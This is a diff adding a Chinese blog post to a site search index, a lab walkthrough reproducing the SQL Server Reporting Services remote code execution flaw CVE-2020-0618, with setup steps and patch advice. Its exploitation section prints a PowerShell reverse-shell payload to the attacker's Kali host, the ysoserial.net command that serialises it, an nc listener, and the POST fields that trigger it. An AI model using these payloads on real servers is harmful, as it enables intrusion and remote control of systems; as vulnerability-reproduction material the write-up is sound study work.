@@ -1557,4 +1557,126 @@
         <category>主机安全</category>
       </categories>
   </entry>
+  <entry>
+    <title>SQLServer远程代码执行漏洞(CVE-2020-0618)</title>
+    <url>/2021/11/15/SQLServer%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2020-0618)/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>SQL Server 是Microsoft 开发的一个关系数据库管理系统(RDBMS)，是现在世界上广泛使用的数据库之一。</p>
+<p>低权限的攻击者向有漏洞版本的SQL Server的Reporting Services实例发送精心构造的payload请求，可利用此漏洞在报表服务器服务帐户的上下文中执行任意代码，即可实现getshell。</p>
+<p>参考：<a href="https://blog.csdn.net/weixin_45006525/article/details/116147471">https://blog.csdn.net/weixin_45006525/article/details/116147471</a></p>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
+<p>SQL Server 2012 for 32-bit Systems Service Pack 4 (QFE)<br>SQL Server 2012 for x64-based Systems Service Pack 4 (QFE)<br>SQL Server 2014 Service Pack 3 for 32-bit Systems (CU)<br>SQL Server 2014 Service Pack 3 for 32-bit Systems (GDR)<br>SQL Server 2014 Service Pack 3 for x64-based Systems (CU)<br>SQL Server 2014 Service Pack 3 for x64-based Systems (GDR)<br>SQL Server 2016 for x64-based Systems Service Pack 1<br>SQL Server 2016 for x64-based Systems Service Pack 2 (CU)<br>SQL Server 2016 for x64-based Systems Service Pack 2 (GDR)</p>
+<hr>
+<h2 id="FOFA语句"><a href="#FOFA语句" class="headerlink" title="FOFA语句"></a>FOFA语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="windows搭建"><a href="#windows搭建" class="headerlink" title="windows搭建"></a>windows搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、Windows Server 2016 Datacenter（https://msdn.itellyou.cn/）</span><br><span class="line">迅雷下载：</span><br><span class="line">ed2k://|file|cn_windows_server_2016_x64_dvd_9718765.iso|6176450560|CF1B73D220F1160DE850D9E1979DBD50|/</span><br><span class="line"></span><br><span class="line">2、SQL Server 2016 Developer Edition x64（https://msdn.itellyou.cn/）</span><br><span class="line">迅雷下载：</span><br><span class="line">ed2k://|file|cn_sql_server_2016_enterprise_with_service_pack_1_x64_dvd_9538279.iso|2959722496|E3F5E07B85F0AB42CA115CE1D6CA27D1|/</span><br><span class="line"></span><br><span class="line">3、下载Postman-win64-7.22.1（https://www.postman.com/）</span><br><span class="line"></span><br><span class="line">4、下载ysoserial</span><br><span class="line">https://github.com/pwntester/ysoserial.net/releases/download/v1.34/ysoserial-1.34.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115193548769.png" alt="image-20211115193548769"></p>
+<p><strong>SQL Server 2016安装</strong></p>
+<ul>
+<li>虚拟机挂载sqlserver.iso镜像文件</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115145241441.png" alt="image-20211115145241441"></p>
+<ul>
+<li>双击安装程序；</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115145423994.png" alt="image-20211115145423994"></p>
+<ul>
+<li>安装选择第一个，向现有安装添加功能；</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115143849650.png" alt="image-20211115143849650"></p>
+<ul>
+<li>一路默认安装。</li>
+<li>到“功能选择”的时候,选择“数据库引擎服务”和“Reporting Services本机”；</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115144058545.png" alt="image-20211115144058545"></p>
+<ul>
+<li><p>一路选择“下一步”。</p>
+</li>
+<li><p>用混合模式创建账号 账号sa,密码输入符合复杂度的即可。并且添加当前账户;</p>
+</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115144438970.png" alt="image-20211115144438970"></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115144539895.png" alt="image-20211115144539895"></p>
+<ul>
+<li><p>一路选择“下一步”，直到安装完成即可。</p>
+</li>
+<li><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115150413999.png" alt="image-20211115150413999"></p>
+</li>
+</ul>
+<p>访问 <a href="http://localhost/ReportS/browse/%EF%BC%8C%E4%B8%8B%E5%9B%BE%E4%BB%A3%E8%A1%A8%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F%E3%80%82">http://localhost/ReportS/browse/，下图代表安装成功。</a></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115151056257.png" alt="image-20211115151056257"></p>
+<p><strong>创建分页报表</strong></p>
+<ul>
+<li>访问：<a href="http://localhost/ReportS/browse/">http://localhost/ReportS/browse/</a> 点击分页报表</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115174849682.png" alt="image-20211115174849682"></p>
+<ul>
+<li>安装报表服务器，[点我下载][<a href="https://www.microsoft.com/en-us/download/details.aspx?id=53613%5D,%E6%88%96%E8%80%85%E6%8C%89%E5%A6%82%E4%B8%8B%E9%A1%B5%E9%9D%A2%E7%82%B9%E5%87%BB%E4%B8%8B%E8%BD%BD">https://www.microsoft.com/en-us/download/details.aspx?id=53613],或者按如下页面点击下载</a>;</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175017110.png" alt="image-20211115175017110"></p>
+<ul>
+<li>打开报表服务。刷新页面，重新点击“分页报表”。点击浏览器的弹窗；</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175204991.png" alt="image-20211115175204991"></p>
+<ul>
+<li>新建一个报表；</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175333893.png"></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175403988.png" alt="image-20211115175403988"></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175446085.png" alt="image-20211115175446085"></p>
+<p>点击凭据，选择次用户名和密码，输入创建的用户名“sa”以及“密码”;</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175511944.png" alt="image-20211115175511944"></p>
+<ul>
+<li>创建视图</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175541795.png" alt="image-20211115175541795"></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175559595.png" alt="image-20211115175559595"></p>
+<ul>
+<li>访问创建的视图;</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175846661.png" alt="image-20211115175846661"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul>
+<li><p>生成payload：</p>
+<p>在powershell中运行下面四条命令，<strong>运行完成后payload自动在剪切板中。粘贴到文档即可</strong>。</p>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&#x27;$client = New-Object System.Net.Sockets.TCPClient(&quot;本人用kali（kali-ip）&quot;,2333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  =$sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&#x27;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">.\ysoserial.exe <span class="literal">-g</span> TypeConfuseDelegate <span class="operator">-f</span> LosFormatter <span class="literal">-c</span> <span class="string">&quot;powershell.exe -encodedCommand <span class="variable">$encodedCommand</span>&quot;</span> <span class="literal">-o</span> base64 | clip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115175923170.png" alt="image-20211115175923170"></p>
+<p>将剪贴板的payload粘贴到文本中；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115180008545.png" alt="image-20211115180008545"></p>
+<ul>
+<li>kali监听相应端口</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>安装并启用postman，发送post包，具体步骤如下：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># post请求地址：http://localhost/ReportServer/Pages/ReportViewer.aspx</span><br><span class="line"></span><br><span class="line"># type选择NTLM模式</span><br><span class="line"></span><br><span class="line"># 填入服务器的用户名（username）和密码(password)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115173000885.png" alt="image-20211115173000885"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Body中填入键值对</span><br><span class="line">NavigationCorrector$PageState=NeedsCorrection</span><br><span class="line">NavigationCorrector$ViewState=payload</span><br><span class="line">__VIEWSTATE=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115172742359.png" alt="image-20211115172742359"></p>
+<ul>
+<li>点击发送；</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115180606134.png" alt="image-20211115180606134"></p>
+<ul>
+<li>nc已经成功收到反连shell；</li>
+</ul>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211115180739356.png" alt="image-20211115180739356"></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>目前微软官方已针对受支持的版本发布了修复该漏洞的安全补丁，请受影响的用户尽快安装补丁进行防护。</p>
+<p>官方下载链接：<a href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0618">https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0618</a></p>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
 </search>
